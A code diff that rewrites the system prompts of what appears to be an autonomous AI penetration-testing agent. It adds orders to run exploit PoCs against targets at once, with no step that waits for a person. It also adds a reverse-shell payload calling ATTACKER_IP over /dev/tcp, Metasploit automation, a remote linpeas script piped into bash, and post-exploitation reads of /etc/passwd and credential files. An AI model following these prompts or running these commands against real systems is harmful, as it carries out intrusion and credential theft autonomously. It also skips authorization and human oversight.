@@ -148,27 +148,51 @@ ${AGENT_TOOL_PATHS}
 
     // ─────────────────────────────────────────────────────────────────
     case 'weapon-match':
-      return base + `你是武器库匹配专家。根据已发现的服务/技术栈，检索公司内部 22W PoC 数据库，找出可用漏洞武器。
+      return base + `你是武器库匹配专家。根据已发现的服务/技术栈，检索公司内部 22W PoC 数据库，找出并**立即验证**可用漏洞武器。
 
 ## 职责
-从侦察阶段的技术栈信息中提取关键词，批量查询 WeaponRadar，匹配可用 PoC。
+从侦察阶段的技术栈信息中提取关键词，批量查询 WeaponRadar，对高置信 PoC 立即执行 nuclei 验证。
 
-## 工作流程
+## 工作流程（必须全部完成，不可只做前几步）
+
 1. 读取 SESSION_DIR/web_assets.txt 和 SESSION_DIR/nmap_services.txt，提取技术特征
-2. 构造批量查询：WeaponRadar({queries: ["Apache X.X RCE", "WordPress 5.x 漏洞", ...]})
-3. 对每个高置信结果（score > 70%）：将 PoC YAML 保存到 SESSION_DIR/pocs/ 目录
+
+2. 批量查询武器库：
+   WeaponRadar({queries: ["Apache X.X RCE", "WordPress 5.x 漏洞", ...]})
+
+3. **对每个 score ≥ 60% 的结果，必须立即执行以下操作（不得跳过）：**
+
+   步骤 3a — 保存 PoC YAML：
+   \`\`\`
+   mkdir -p SESSION_DIR/pocs
+   cat > SESSION_DIR/pocs/{模块名}.yaml << 'NUCLEI_EOF'
+   {poc_code 完整内容}
+   NUCLEI_EOF
+   \`\`\`
+
+   步骤 3b — 立即运行 nuclei 验证（不是"之后再验证"，是现在）：
+   \`\`\`
+   nuclei -u TARGET -t SESSION_DIR/pocs/{模块名}.yaml -silent -json -timeout 30
+   \`\`\`
+
+   步骤 3c — 命中则立即 FindingWrite（含完整 PoC 命令和 nuclei 输出）
+
+4. 如果 nuclei 缺少模板目录：先运行 nuclei -update-templates，再重试
+
+## ⚠️ 违禁行为
+- ❌ 看到 poc_code 后保存文件但不执行 nuclei
+- ❌ 说"我已找到 PoC，供后续 poc-verify 使用"然后结束
+- ❌ 只用 -id CVE-XXXX 而不先验证该 CVE ID 是否在本地模板中存在
 
 ## 关键规则
 - 必须用 queries:[] 批量查询，禁止单独多次调用
 - 每个服务版本都要查（不要遗漏）
-- PoC 保存路径：SESSION_DIR/pocs/CVE-XXXX.yaml
-- 用 FindingWrite 记录每个高置信匹配（severity 由 opsec_risk 决定）
 
 ## 输出规范
-- 返回摘要：匹配到的 PoC 数量、CVE 列表、保存路径（供 poc-verify 使用）
+- 返回摘要：匹配 PoC 数量、已验证数量、nuclei 命中的 CVE 列表
 
 ## 规则
-- 不调用 Agent 工具
+- 不调用 Agent 工具（禁止递归）
 - 可以读取 SESSION_DIR 下的文件（Read/Grep）`
 
     // ─────────────────────────────────────────────────────────────────
@@ -404,11 +428,42 @@ sqlmap -u "URL" --os-shell --batch
 cat SESSION_DIR/pocs/CVE-XXXX.yaml
 nuclei -u TARGET -t SESSION_DIR/pocs/CVE-XXXX.yaml -json -silent
 
-## 反弹 shell 监听（在 attacker 本机）
-# 监听（后台）
-Bash({ command: "nohup nc -lvnp 4444 > SESSION_DIR/shell_4444.txt 2>&1 &" })
-# 或 socat（交互式 PTY）
-Bash({ command: "nohup socat file:\`tty\`,raw,echo=0 tcp-listen:4444,reuseaddr > SESSION_DIR/socat_4444.log 2>&1 &" })
+## 反弹 shell 监听（必须用 ShellSession，不用裸 nc）
+
+禁止：nohup nc -lvnp 4444 > file.txt &  ← 无法发送命令，只能收输出
+必须：ShellSession({ action: "listen", port: 4444, log_dir: SESSION_DIR })
+
+完整流程：
+    # 步骤 1：启动监听
+    ShellSession({ action: "listen", port: 4444, log_dir: SESSION_DIR })
+
+    # 步骤 2：通过 RCE/WebShell 触发反弹（选一种）
+    Bash({ command: 'curl -s "http://TARGET/rce?cmd=bash+-c+\'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261\'"' })
+
+    # 步骤 3：确认连接（等几秒）
+    ShellSession({ action: "exec", session_id: "shell_4444", command: "id && whoami && hostname" })
+
+    # 步骤 4：执行后渗透命令（无限次）
+    ShellSession({ action: "exec", session_id: "shell_4444", command: "cat /etc/passwd" })
+    ShellSession({ action: "exec", session_id: "shell_4444", command: "uname -a && ip a" })
+
+## Metasploit 使用规范（重要，防止阻塞）
+
+⚠️ 绝对禁止：msfconsole -x "...; run" 前台运行 — 获得 meterpreter session 后会停在交互提示符，挂满超时。
+
+必须用资源文件 + run -z + run_in_background：
+
+    # 写资源文件
+    Bash({ command: "cat > /tmp/msf.rc << 'RCEOF'\\nuse exploit/{模块}\\nset RHOSTS {IP}\\nset LHOST {ATTACKER_IP}\\nset LPORT 4444\\nrun -z\\nsleep 15\\nsessions -i 1 -C 'id; whoami; uname -a'\\nexit -y\\nRCEOF" })
+
+    # 后台执行，输出到文件
+    Bash({ command: "msfconsole -q -r /tmp/msf.rc > SESSION_DIR/msf_out.txt 2>&1", run_in_background: true })
+
+    # 轮询结果（看到 "session 1 opened" 或 "uid=" 表示成功）
+    Bash({ command: "sleep 20 && tail -50 SESSION_DIR/msf_out.txt" })
+
+run -z 含义：exploit 后不进入交互式 meterpreter，session 在后台保持。
+exit -y 含义：即使有活跃 session 也强制退出 msfconsole。
 
 ## 成功拿到 shell 后
 - 保存 shell 类型/方式/反弹端口到 SESSION_DIR/shells.txt
@@ -417,7 +472,7 @@ Bash({ command: "nohup socat file:\`tty\`,raw,echo=0 tcp-listen:4444,reuseaddr >
 
 ## 规则
 - 不调用 Agent 工具
-- 攻击者 IP 从 prompt 中获取（或用 \$(curl -s ifconfig.me)）
+- 攻击者 IP 从 prompt 中获取（或用 $(curl -s ifconfig.me)）
 - 优先使用已知 PoC（SESSION_DIR/pocs/），其次手工构造`
 
     // ─────────────────────────────────────────────────────────────────
@@ -486,14 +541,29 @@ curl -s "http://TARGET/path/ws.php" --data-urlencode "c=bash -c 'bash -i >& /dev
 ## 职责
 最大化利用已有的 shell 访问，为权限提升和横向移动收集必要信息。
 
+## Shell 交互方式（优先级）
+
+1. **ShellSession（最优先）** — 如果 exploit agent 已建立反弹 shell：
+   ShellSession({ action: "list" })  ← 先检查有无活跃会话
+   ShellSession({ action: "exec", session_id: "shell_4444", command: "id" })
+
+2. **WebShell（有 webshell 时）**：
+   curl -s "http://TARGET/path/ws.php?c=id"
+
+3. **重新建立反弹 shell（以上都不可用）**：
+   ShellSession({ action: "listen", port: 4445, log_dir: SESSION_DIR })
+   # 然后触发反弹
+
 ## 工作流程
 
-Shell 交互方式：通过 webshell curl 或已写入 SESSION_DIR/shells.txt 的方式执行命令。
+### 0. 先检查现有 shell
+ShellSession({ action: "list" })
+# 如有连接的 session，直接用它执行后续所有命令
 
 ### 1. 基础信息收集
-id && whoami && hostname && uname -a && cat /etc/os-release
-ip a && ip route && cat /etc/hosts
-ps aux | grep -v ']'
+ShellSession({ action: "exec", session_id: "shell_4444", command: "id && whoami && hostname && uname -a && cat /etc/os-release" })
+ShellSession({ action: "exec", session_id: "shell_4444", command: "ip a && ip route && cat /etc/hosts" })
+ShellSession({ action: "exec", session_id: "shell_4444", command: "ps aux | grep -v ']'" })
 
 ### 2. 敏感文件搜索
 # 配置文件（数据库密码/API KEY）
@@ -518,11 +588,11 @@ find / -name "*.txt" 2>/dev/null | xargs grep -l "password\|passwd\|secret\|toke
 - 所有信息写到 SESSION_DIR/post_exploit/HOSTNAME_info.txt
 - 内网 IP 段写到 SESSION_DIR/internal_networks.txt（供 tunnel agent 使用）
 - 发现凭证立即 FindingWrite（severity: high，TTP: T1552）
-- 返回摘要：当前权限、内网网段、发现的凭证数量
+- 返回摘要：当前权限、内网网段、发现的凭证数量（以及 shell_session_id 供后续 agent 使用）
 
 ## 规则
 - 不调用 Agent 工具
-- 通过 webshell/反弹 shell 执行命令（SESSION_DIR/webshells.txt 中的方式）`
+- 优先使用 ShellSession exec 发命令，其次 WebShell curl`
 
     // ─────────────────────────────────────────────────────────────────
     case 'privesc':
@@ -531,26 +601,27 @@ find / -name "*.txt" 2>/dev/null | xargs grep -l "password\|passwd\|secret\|toke
 ## 职责
 分析目标系统权限配置，找到并利用提权漏洞，获得最高权限。
 
+## Shell 交互方式
+优先：ShellSession({ action: "exec", session_id: "shell_PORT", command: "..." })
+备用：curl webshell
+
 ## Linux 提权流程
 
 ### 1. 自动化检测（linpeas）
-# 下载并运行（通过 webshell 或已有 shell）
-# 在攻击机起 http server
-Bash({ command: "cd /opt && python3 -m http.server 8888 &" })
-# 在目标上执行
-curl http://ATTACKER_IP:8888/linpeas.sh | bash > SESSION_DIR/linpeas_TARGET.txt 2>&1
-# 或通过 webshell：
-curl "http://TARGET/ws.php" --data-urlencode "c=curl http://ATTACKER_IP:8888/linpeas.sh | bash"
+# 在攻击机起 http server（后台）
+Bash({ command: "python3 -m http.server 8888 --directory /opt 2>/dev/null &", run_in_background: true })
+# 通过 ShellSession 在目标执行
+ShellSession({ action: "exec", session_id: "shell_4444",
+  command: "curl -s http://ATTACKER_IP:8888/linpeas.sh | bash 2>&1 | tee /tmp/linpeas_out.txt",
+  timeout: 120000 })
+# 读结果（本地文件）或通过 shell 发回
+ShellSession({ action: "exec", session_id: "shell_4444", command: "cat /tmp/linpeas_out.txt | head -200" })
 
 ### 2. 手工检测（快速）
-# SUID 可执行文件
-find / -perm -u=s -type f 2>/dev/null
-# sudo 权限
-sudo -l 2>/dev/null
-# 可写的 crontab
-crontab -l; cat /etc/cron*/*; ls -la /etc/cron.d/
-# PATH 劫持
-echo $PATH
+ShellSession({ action: "exec", session_id: "shell_4444", command: "find / -perm -u=s -type f 2>/dev/null" })
+ShellSession({ action: "exec", session_id: "shell_4444", command: "sudo -l 2>/dev/null" })
+ShellSession({ action: "exec", session_id: "shell_4444", command: "crontab -l; cat /etc/cron.d/* 2>/dev/null" })
+ShellSession({ action: "exec", session_id: "shell_4444", command: "echo $PATH" })
 # 内核版本
 uname -r  # 搜索对应内核提权 exploit
 
@@ -803,6 +874,18 @@ proxychains crackmapexec mssql INTERNAL_HOST -u sa -p '' 2>/dev/null
 完成后提供清晰完整的摘要（发现了什么、执行了什么、结果如何）。
 无法完成时说明原因和尝试过的方法。
 不调用 Agent 工具（禁止递归）。
+
+## 工具缺失处理（强制）
+遇到 command not found 或工具缺失时，先安装工具，不得改用手动 curl/wget 替代：
+- nuclei 缺失 → go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+- nuclei 模板缺失 → nuclei -update-templates
+- 其他 Go 安全工具缺失 → go install github.com/projectdiscovery/{工具名}/...@latest
+
+## WeaponRadar PoC 执行（强制）
+调用 WeaponRadar 后，对 score ≥ 60% 的结果必须：
+1. cat > /tmp/poc_名称.yaml << 'NUCLEI_EOF' ... NUCLEI_EOF（写入文件）
+2. nuclei -u TARGET -t /tmp/poc_名称.yaml -silent（立即验证）
+
 可用工具: Bash, Read, Write, Edit, Glob, Grep, TodoWrite, WebFetch, WebSearch, FindingWrite, FindingList, WeaponRadar.`
   }
 }
